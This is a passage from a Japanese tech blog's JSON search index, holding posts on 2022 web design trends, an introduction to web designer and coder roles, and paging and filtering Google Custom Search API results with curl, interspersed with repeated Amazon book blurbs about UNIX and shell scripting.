サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-20T17:50:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（３）"},{"content":"出典元：Web design trends for 2022 | Layout\nこの2年間で学んだことは、私たちは常に新しいものに適応し続けなければならないということです。2022年に向けて、デザイナーは人生のカオスを受け入れ、それをデザインで表現し始めています。\n2022年のトレンドは、より大胆で、よりクリエイティブで、よりインタラクティブなデザインに移行しています。クリエイターは、より破壊的なものに傾倒し、「良い」ウェブデザインとされるものの境界を押し広げようとしています。\n2022年に期待されるトレンドを取り入れ、新しい年のクリエイティビティを高めてください。\nインタラクティブなミニサイト あなたの実力をアピールしてください。専門性の高いコンテンツとインタラクションで、小規模で統制のとれた環境でスキルを発揮することは、デザイナーが新しいクライアントを獲得するための1つの方法です。また、潜在的な顧客に対しては、「作ることを楽しむ」ことで、オンリーワンの体験を提供できることをアピールしています。\n韓国の開発者、Jungik Leeが制作した、3つの簡単なタスクのいずれかをクリアするミニサイトです。たくさんの色と簡単な操作で、いろいろなものを作ったり動かすことができ、カラフルな丸でページが埋め尽くされる様子は、実に楽しいものです。\nアムステルダム在住のウェブデザイナー、ヴィクトワール・ドゥイさんの小さなポートフォリオサイト では、インタラクティビティを駆使して人々の関心を集めています。カーソルを動かすだけで、色を変えたり、糸を引っ張ったり、オブジェクトを動かしたりできます。\nレトロな雰囲気のあるデザイン 米国のWebデザイナーの平均年齢は37歳で、ミレニアル世代に位置づけられます。ミレニアル世代はインターネットを日常的に利用するようになった最初の世代ですから、多くのデザイナーがウェブ創成期に流行したアートやタイポグラフィー、カラーに影響を受けているのは当然といえば当然でしょう。\nWild SoulsのEコマースサイトは、カラフルなシェイプと重なり合うスタイルで、食品会社にふさわしい楽しくて活気のある美学を表現しています。 ナッツ、ナッツバター、ハチミツ、マーマレードの専門店で、商品の上にカーソルを置くと、90年代にインスパイアされたビジュアルテーマをもとに、新しい質感や形がセンスよく追加されます。\nカートゥーン ネットワークは、白と黒を基調とし、大胆な色使いと楽しいアニメーションで、レトロでありながらトレンドを押さえたサイトです。\nオープンコンセプトデザイン この大流行が、私たちのデザイン嗜好にも影響を与えているのかもしれません。なぜなら、デザインに多くのオープンスペースを設けるという新たなトレンドが生まれたからです。6フィート（約3.5メートル）とはいかないまでも、デザイナーはセクション間のスペースをどんどん広げ、見出しに集中し、時にはヒーロー画像を完全に削除してユーザーに十分なスペースを与えています。\nどんな種類の蒸留酒もシャープでキレがあり、コロラド州デンバーにあるベア・クリーク蒸留所のウェブサイトも、余計な添加物を排除しています。ウェブサイトのデザインコンセプトは、彼らが精製するウォッカ、バーボン、ラム、ウイスキーと同様にクリーンです。\nアタルソン は、ニューヨークを拠点に、プロダクトとパッケージのデザイン、素材調達、製造を行っている会社です。サステナビリティは彼らのプロセスの中核であり、クリーンな製造という考え方は、ホワイトスペースの使用によってサイトでも視覚的に反映されています。このオープンスペースにより、デザインされた製品にスポットライトが当たり、画像上のホバー効果により、製品の概要や企業価値の説明が表現されています。\nより多くのカスタマイズ ユーザーがオンライン上で時間とお金を費やす機会が増えるにつれ、プロバイダーはより幅広い層のユーザーにアピールするための新たな方法を見出しています。そのため、多くのプロバイダーは、サイトやアプリで利用できるパーソナライゼーションのレベルを高め、すべてのサイトが従うべき標準的なアクセシビリティのベストプラクティスを超えるインクルージョン機能の大幅な改善を行っています。\nPinterest の「ビューティー」カテゴリは、サイト内でもっとも検索されているカテゴリの1つであり、同社はすべてのユーザーに対してより包括的に対応する必要性を認識していました。Pinterestは現在、「skin tone range」機能を提供することで、このカテゴリーにおいてより速く、よりパーソナライズされた体験を生み出しています。多くのユーザーにとって、これはアプリ上の明るい肌色の過飽和状態に対する答えであり、すべてのPinterestユーザーがより迅速かつ容易に自分に合った外見を見つけることができるようになりました。\nMastercardは、「True Name」システムを構築することで、より多くのカード会員が取引時に自分の本当のアイデンティティを表現できるようにする方法を見出しました。これにより、トランス系やノンバイナリのMastercard保有者は、法的に名前が変更されているかどうかにかかわらず、デッドネームの代わりに本名をカードに記載することができるようになりました。\n3Dオブジェクト、2Dスクロール 3Dモデルを使ったデザインと、フラットな2Dのコンテンツ表現は、説得力があり、完全に一体化しているように見えます。インタラクティブな3D要素を背景に、消化しやすいコンテンツを予測可能な方法で提示することは、ユーザーが物理的な概念をよりよく理解するためにとくに有効です。\nロシア・モスクワの中心部に位置するこの新しいビジネス街のプロモーションサイトは、3Dのセンターピースとシンプルでフラットなコンテンツに焦点を当てた素晴らしい例です。トップページにはスコルコボ・パークの可動式模型が表示されていますが、目立つように配置されたコンテンツの影に隠れることはありません。\nOne Ocean Scienceは、海洋保全と研究のグローバルリーダーを学際的な視点でつなぐことを目的とした、知識共有型のサミットです。ホームページでは、地球の3Dモデルの上を2Dでスクロールし、スクロールに合わせてさまざまな地域とそこで行われている研究を強調することでユーザーに情報を与えてます。\nブルータリズム・ライト ブルータリズムとは、非常にブロック的で幾何学的な、厳しい芸術や建築のスタイルを指します。ウェブデザインでは、従来のルールにとらわれず、ミニマリズムを追求した、大胆かつシンプルなスタイルが目立ちます。白と黒を基調としたサイトが多く、装飾はほとんどなく、文字も太く、峻厳な仕上がりになっているのが特徴です。\nイタリアのクリエイティブ・エージェンシー、カロセリングのブランド・アイデンティティは、正直で率直であることです。現実的な期待値を設定し、戦略の影響を考え抜き、クライアントの時間的・予算的制約を尊重することを信条としています。ブルータリスティックなサイトは、飾り気のない代理店のパートナーとしての彼らのストーリーを表現するのに役立っています。\nパリを拠点とするカリフォルニア生まれのデザイナー、リック・オウエンスは、かつて自身の家具デザインに対する哲学を \u0026ldquo;ブルータリズムの洞窟の中でブルータリズムの火のそばのブルータリズムの岩の上に立つ毛皮 \u0026ldquo;と表現したことがあります。彼の服やアクセサリーラインのウェブサイトには、家具はありませんが、イメージやレイアウトに明確なブルータリズムのインスピレーションを感じることができます。\nガラスモルフィズム グラスモーフィズム とは、その名の通り、画面がガラスでできている、あるいはガラスで覆われているかのように見せる技術で、一般的にはユーザーインターフェイスの背景をぼかすために使用されます。2022年には、デザイナーがガラスのようなアニメーションオブジェクトやテキストを作成し、フロントエンドの境界を押し広げることで、このトレンドはさらに人気を集めると思われます。\nデジタル製品エージェンシーの Dovetail Studios は、異なる角度で回転する入れ子のリングのGlassmorphicセットをアニメーション化しました。目を引くとともに、彼らの3Dモデリング能力の高さがうかがえます。サイト内の他のアイコンも、この効果を反映しています。\n同じくデジタル・クリエイティブ・エージェンシーのLo and Behold Studios も、ホームページでGlassmorphicのアニメーション・オブジェクトを使用しています。しかし、全体的に明るいテーマであるため、ユーザーがDovetailのサイトを見たときに感じる印象とはまったく異なるものとなっています。\nクリエイティブなスクロール効果 多くのデザイナーは、昨年の横スクロールのトレンドを発展させ、さらにスクロールの効果を試しています。水平、横、多方向のいずれであっても、ユーザーがサイト内を移動する方向を変えることは、全体としてよりダイナミックな体験をユーザーに与える簡単な方法です。\nオランダの家具メーカー Moooi は、ユーザーがスクロールするにつれて、コレクションの奥深くに入り込んでいきます。同社のサイトでは、3つの体験ができます。美しく咲き、重力に逆らっていくまるで紙芝居のような体験です。それぞれ、画面を開くとコレクションが次々と現れ、スクロールするたびに新しいパターンや飾り模様に飛び込んでいきます。\n写真家のKayla Fisherさんの サイト では、サイドバイサイドスクロールで、メニューは画面の左側にべったりと配置されています。これによって、ユーザーにより深く入り込んでもらうための大きなボタンを見失うことなく、視覚的に魅力的な方法で彼女の作品を見ることができます。\n特大のタイポグラフィ ウェブサイトは、企業としてのあり方を大胆に表現するものであるべきです。多くの企業がこの考えを真摯に受け止め、見出しに特大のタイポグラフィを使用したり、ヒーロー画像（キャッチ画像）の代わりに使用したりしています。\nテクノロジー研究集団 HUMAIN は、人間の体験と技術革新の間のギャップを埋めるために活動しています。クロノス・グループの支援を受け、オンラインと生活の両方で人間の経験を向上させるために新技術を使用する新しい方法を見つけることを目的としています。複雑なストーリーを持つこの企業は、ヒーロー画像の代わりにテキストを使用することで、サイトに入った瞬間からその使命を訴えています。\nヘッドホンといえば、視覚的なものと同じくらい聴覚的なアイデアが思い浮かびます。ヘッドホンメーカーの AIAIAI の社名は、名前と同じくらい感嘆詞で、サイトを訪れたユーザーに大胆な主張を叫んでいます。大きなテキストで会社を紹介した後、折り返しのすぐ下の小さなヒーローに隣接した動画が表示され、ヒーロー画像→テキストという従来のパターンを崩しているのです。\n可視化された境界線 目に見えるボーダーは、デザインに構造を与え、コンテンツを通してユーザーの注意を引きつけます。シンプルな線だけで構成されるボーダーは、整然としたサイトを必要とするクライアント向けのデザインに役立ちます。一方、ファンキーでインタラクティブなボーダーは、大胆な色使いやインタラクティブな効果によって、オンライン訪問者にさらなる視覚的な興味を与えることができます。\n独立機関である Bonjour Paris は、可視化されたボーダーと水平スクロールを組み合わせることで、ミニマルでありながら興味をそそるサイトになっています。線状のボーダーは、サイト全体からプロジェクトセクションまで続き、曖昧で忙しい印象を与えることなく、新しい形を生み出しています。\nオーストラリアのレストラン「Curry Cafe」は2つの店舗を持ち、サイトのスクロールボーダーは、ユーザーがカラフルで魅力的な他のコンテンツを消費するための強固なフレームワークを提供します。\n抽象的なビジュアルを持つコラージュ部品 ウェブが始まってから、私たちは長い道のりを歩んできました。あるデザイナーは構造化された美学を受け入れ、またあるデザイナーは逆の方向に進んでいます。大胆な色使い、重なり合う画像、複数のテクスチャーなど、それぞれの要素が丁寧にデザインされていれば、シームレスに融合することができるのです。\nIlluminating Radioactivity は、 スティムソンセンター 、 Reinventing Civil Defenseプロジェクト 、 [Bombshelltoe Policy x Arts Collective]https://bombshelltoe.com/ が共同で作成した教育用ウェブサイトです。放射能」という言葉の歴史や意味、私たちの連想、そして放射能が科学、娯楽、医療などの分野でどのような役割を担ってきたのかが紹介されています。スクロールすると、歴史を物語る古い写真と、鮮やかで抽象的な形状の組み合わせが目に飛び込んできます。\nオーストラリアのThe Loved Up Coは、パートナーとの夜の生活に必要なものがすべて揃った便利なキットで、デートの夜を華やかにするお手伝いをしています。ホームページでは、白黒写真のボディに、笑顔の口元や花、カクテルを組み合わせたコラージュ風の人物を掲載。また、抽象的な形や円、ジグソーパズルを随所に配し、コンテンツの中で視線を動かし続けています。\nウェブの未来をデザインする これらのトレンドに注目し、気になるコンセプトを試してみてはいかがでしょうか。2022年のウェブデザインのトレンドは、昨年のトレンドの延長線上にあることにお気づきの方もいらっしゃるのではないでしょうか。\n気に入ったものはありましたか？私たちが見逃しているものがあれば、教えてください。そして、残るスタイルも流行り廃りも、デザイナーが今年、クライアントと一緒に何を作るかにかかっていることを忘れないでください。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-20T17:36:49+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/catch_hua1e03cb04863b34ec3302b219f888af8_22468_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/","title":"2022年のWebデザインの最新トレンドとレイアウト"},{"content":"はじめに 「未経験でもWebデザイナー、コーダーになろう」ではWebデザイナーやコーダーなどWeb業界を目指す方に、現役Webデザイナー兼コーダーができるだけわかりやすく、Webサイトをデザインしたり、作ったりする方法は情報を伝える講座です。\n初心者の方、そうでない方など、いろいろな方大歓迎です。\nまずはWebデザイナーやコーダーと言われる人たちがいる、Web業界の実際はこうだよというのをお伝えします。\nWeb業界に入るためには未経験だと厳しい？ 未経験だと厳しい？ 学校で習わないと難しそう。 このようなことを思っているかもしれません。しかし、そんなことなありません。\nWebで働いてみたいという気持ちとポートフォリオと呼ばれる作品集。\nなにより少しでもできるてしまえば、入れる業界だと思います。\n\u0026quot;\u0026quot; 初期費用が色々かかる？ パソコンを用意 Photoshopなどの高いアプリを買う必要がある こういったことで、初期費用が色々かかるかと思っている人も多いと思います。\n今の時代は様々なWebサービスを駆使していろいろなことが無料でできます。\nもちろん、パソコンを持っていたほうが作業は簡単かもしれませんが、iPhoneやiPad、廉価なChromeBookやWindowsなどでもデザインからコーディングまでできてしまいます。\n特にiPhoneやiPadはデザインに特化することができると思います。\nそういったサービスやコンテンツ、アプリを使用してデザインからコーディングを行って誰でも簡単に自分のサイトを持つことができるようになりました。\nほんといい時代になりましたね。\nWEBデザイナーとは Webデザイナーと聞いてイメージするのは\nカッコいいサイトをデザインしている人 美的センスがいりそう Photoshopを使ってデザインをしている と思うかもしれません。しかし、それが重要だと私は思いません。\nもっと重要なのは「情報をわかりやすくして、配置する力」ではないかと思います。\n\u0026quot;\u0026quot; WEBデザイナーとは「情報をわかりやすくして、配置する人」 Webデザイナーと一般的なデザイナーの違いは「Webデザイナーは何かを表現するものではない」と言う点だと思います。\n「Webデザイナーは情報をわかりやすくして、配置する人」こういうものではないかなと私は考えてます。\nデザインする上で、大事なのはそれぞれの関係性はどうなっているかです。\nそれをわかりやすく伝える、そのためには関連性があるものは近くにあったほうがいい。\nそうやって散らばっている情報と情報をつなげていく。それがWebデザイナーではないかと思います。\n\u0026quot;\u0026quot; Webコーダーは「Webデザインを表示して、使い勝手を作る人」 WebコーダーはWebデザインを実際にHTMLと言われる言語に書き換えて、CSSと呼ばれる言語でHTMLをお化粧していきます。\nお化粧をしていく上で大事なのはGoogleやBingのクローラーと呼ばれるプログラムに拾われやすくするということを意識しなければなりません。\nこれを SEO といいますが、今は知らなくても大丈夫です。\n簡単に言えば、ネットという広い海に出すためにわかりやすい地図を作ってくれる人にわかりやすく伝えるということです。\nデザイナーは見た目を作っていきますが、コーダーは使い勝手を作っていると言ってもいいのかもしれません。\nその他にも、Javascriptと呼ばれる言語を使って動きやいろいろな処理を行う場合もあります。\nWebデザイナーとコーダーは別のほうがいい？ Webデザイナーとコーダーが別々の作業を行って、もう片方の仕事内容を知らないでもいいかといえば、そうではありません。相互に理解していたほうがいいと思います。\nWebデザイナーがコーディングを知らない場合 例えば、Webデザイナーがボタンを押したときや開閉機能をつけたときの挙動をデザインしたとします。その場合の動作は誰が考えるのでしょう？\n多くの場合はデザイナーの頭の中に「ふわっと出したい」や「回転しながら出したい」といった考えがあるかと思います。スライドするコンテンツについても同様です。\nその際に、コーディングを知らなかったら指示を出せずに、コーダーの解釈でデザインが行われてしまいます。\nWebコーダーがデザインを知らない場合 逆にコーダーがデザインを知らないと、どうでしょうか。\n小さなデザインを見落として、デザイナーが作ったものと違うものが出来上がってしまうかもしれません。\n小さなデザインだったら気にならないのでは？と思うかもしれませんが、デザインではその違いが大きな違いにつながったりします。\nお互いに知ることが大事 お互いのことを知っていることで、仕事の効率も上がると思いますし、デザイナーはそのうち「自分で書いたほうがより良いデザインができる」と考え、コーダーは「なんかデザインがおかしいから、デザインから自分でやってみる」といったことも往々にしてあります。\nわたしはそうでした。\n特にWebのコンテンツはいろいろなことができてしまうので、知っているのと知らないのでは雲泥の差になります。\n両方できるメリット Webデザインとコーディングが両方できると、なんとアプリを作ることができてしまいます。なので、自分の力を増やしていくために、片方だけではなくデザインとコーディング、両方の力を養っていったほうが断然いいですね。 \u0026quot;\u0026quot; Webデザイナーとコーダーに重要なこと Webデザイナーとコーダーになる上で特に大事なことが2点あります。\nサイトのターゲットは誰なのか サイトの最終的なゴール地点はどこなのか サイトの使い勝手はいいか 必要としている情報に簡単にアクセスできるか サイトのやブランドの持つイメージ 上記のようなことに注意して、デザインやコーディングを行っていく必要があります。\n例えば、若者向けのサイトなのに、すごく文字が大きかったり、その逆などは使う側にとってのストレスとなってしまいます。\nデザインで言えば 配色 や 文字サイズ には特に気をつける必要があります。\nコーダーで言えば 対象としているブラウザで崩れがないか や 動きがうるさくないか といったことに気をつける必要があります。\nUXとは？ UX（User eXperience）といいます。日本語ではユーザー体験となりますね。ユーザーのストレスにならないようにすることを、Webを通してユーザーに快適な空間や体験を与えるということです。 次回の予定 次回からはまず、簡単なWebデザインをしていきたいと思います。\nといっても、いきなりデザインを行うのは大変なのでまずは既存のサイトや、簡単な1ページのサイトの大枠を作成できたらなと思います。\nそれではまたの講座で会いましょう。\nおすすめの書籍 HTML\u0026amp;CSSとWebデザインが1冊できちんと身につく本[増補改訂版] 美しいデザインでサイト制作の知識とワザが「1冊で」身につく本格入門! PC\u0026amp;モバイルサイトデザインの基礎力とHTML・CSSコーディングの知識が1冊で同時に身につく! ウェブ制作を仕事にするならHTMLとCSSを学ぶことから始めますが、本書は体系立てた文法学習よりも、まずは「コーディングとはどのような作業なのか」を理解できる初学者向け入門書です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 1冊ですべて身につくHTML \u0026amp; CSSとWebデザイン入門講座 【全国の書店員さんがオススメする本「CPU大賞」第1位受賞!】 ずっと、一番売れているHTML本!\nWeb界隈やデザイナーに大人気! Web関連の情報やデザインについて記事が学べる『Webクリエイターボックス』の管理人、 Manaによる渾身のHTML \u0026amp; CSSとWebデザインが学べる本です。\n著者は、カナダやオーストラリア、イギリスの企業でWebデザイナーとして働き、現在は全国各地でWeb関連のセミナーに登壇し、Webサイト制作のインストラクターとして教育に携わっている。ブログ「Webクリエイターボックス」は2010年日本のアルファブロガーアワードを受賞。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\nこれだけで基本がしっかり身につく HTML/CSS\u0026amp;Webデザイン1冊目の本 Webサイト制作をこれから学ぶ人へ送る “1冊目\u0026#34;に最適の入門書! 【学びをサポートする4大特典つき】\n本書は手を動かしてWebサイトを作りながら HTML/CSSとWebデザインの基本を楽しく学べる入門書です。\n初学者が1冊目に読む本としてふさわしい内容を盛り込んでいるため、これを読めば必要な基礎知識がひととおり身につきます。 Amazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n","date":"2022-01-20T14:10:38+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/catch_hu3a64f66fd9809c30bb076df824d97a59_1036155_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/","title":"第0回のテーマ「Webデザイナー、コーダーってなに？」"},{"content":"Google Custom Search API 10件目以降の取得方法について 「木材流通統計調査」をgoogleで検索してみると最初の方は、政府関係の木材流通統計調査の概要説明などが上位に並んでいる感じです。\nそういったものからは木材流通統計調査の社会的関心がある項目を抽出することは難しそうです。\n２０件目超えたあたりに以下の記事が来ました。\nビジネス特集 木材が消えた？身近に迫る “ウッドショック”\n2021/06/01 — 【NHK】世界的に木材の価格が高騰している。 \u0026hellip; 農林水産省の「木材流通統計調査」によると、4月の「杉の丸太」の価格は去年の同じ月と比べて10％ \u0026hellip;\n22/01/19 にこのページにアクセスしました。\nここから「丸太の価格」などの高騰が「ウッドショック」と呼ばれる社会的現象を起こしていることがわかります。\nGoogle Custom Search APIは10件までしか結果を取得しないので、10件目以降の結果を取得する必要がありそうです。\n眺めてみると50件くらい取得すれば良さそうです。\nGoogle Custom Search APIの10件目以降を取得する方法はクエリのパラメータ startに開始位置を設定すれば良さそうです。\n最大100件目まで取得できるみたいです（10件ずつなのでstartの値を変えて10回叩く必要がありますね）。\nhttps://developers.google.com/custom-search/v1/reference/rest/v1/cse/list\nThe index of the first result to return. The default number of results per page is 10, so \u0026amp;start=11 would start at the top of the second page of results. Note: The JSON API will never return more than 100 results, even if more than 100 documents match the query, so setting the sum of start + num to a number greater than 100 will produce an error. Also note that the maximum value for num is 10.\ncurlで叩くと以下の方法になります。\ncurl \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxxxxxxx\u0026amp;cx=xxxxxxxxxxxxxxxxx\u0026amp;q=木材流通統計調査\u0026amp;start=11\u0026#39; Google Custom Search API 検索対象をnewsだけに絞り込めないか しかし、よくよく考えてみると社会的関心の高い項目を抽出しようと思ったらニュースなどに検索結果を絞り込んだほうが良い気がして来ました。\ngoogle検索結果のニュースタブをクリックして出て来た結果の方が使えそうです。\nニュース ニュースだと「ビジネス特集 木材が消えた？身近に迫る “ウッドショック”」が上位に来ていますし、以下のような興味深い記事もすぐ出て来ます。\nウッドショックはいつ収まるのか？ 住宅価格への影響は？ 木材価格高騰の直接原因と根本原因～時事解説\n輸入材不足の余波で国産材の価格は春先から上昇を続けてきた。農林水産省の木材流通統計調査によると、9月の丸太価格は杉が前年同月比2.4倍、檜は2.9倍の水準だ。木材の使用量で差はあるが、住宅1棟につき少なくとも数十万円以上のコスト増が主に中小工務店らの経営に重くのしかかる。\nGoogle Custom Search API でnewsだけに検索結果を絞り込む方法を調べてみました。\n昔は、クエリにsearchType=image imgType=news をいれれば絞り込めていたみたですが試したところエラーになって現在は使用できなそうです。\ngoogleの仕様書を見てもimgTypeに現在はnewsは指定できないみたいです。\nhttps://developers.google.com/custom-search/v1/reference/rest/v1/cse/list\nschema.org で絞り込む 現在は、検索エンジンの設定画面にある「schema.org」を使用して絞り込むみたいです。\nhttps://cse.google.com/cse/\nschema.orgで設定できる項目は非常に沢山あって何を設定するか迷います。\nhttps://schema.org/docs/full.html\n10個まで設定できるとのことで、とりあえずArticle,review,newsを文言に含むものにしてみました。\ncurlで叩く方法パラメータは今までと全く同じです。\ncurl \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxxxxxxx\u0026amp;cx=xxxxxxxxxxxxxxxxx\u0026amp;q=木材流通統計調査\u0026#39; ウッドショック 林野庁・農林水産省作成資料 - 一般社団法人 宮城県\n木質バイオマス発電のFITは両刃の剣だ（2ページ目） | コラム | 環境\n【ウッドショック】木材価格の高騰は私たちにどう影響？ 住宅の\nなど取得したいコンテンツの絞り込みができました。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 